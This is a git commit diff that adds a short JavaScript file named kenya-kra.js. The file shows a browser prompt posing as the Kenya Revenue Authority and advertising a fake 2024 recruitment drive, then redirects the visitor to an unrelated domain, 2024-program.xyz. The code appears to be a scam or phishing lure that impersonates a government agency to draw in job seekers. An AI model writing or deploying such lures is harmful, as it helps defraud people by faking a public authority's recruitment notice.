e1cb881dd5fa8736c80d0b71ae1504d7e0ecd8cd
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-05-03 21:42:10 -0700

    Update and rename nsi_js.js to kenya-kra.js

---
+++ kenya-kra.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('KRA: Hello Dear, Dont miss this 2024 Ongoing Kenya Revenue Authority Recuitment Kindly press 1 to start Application Now','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/kenya';
+}
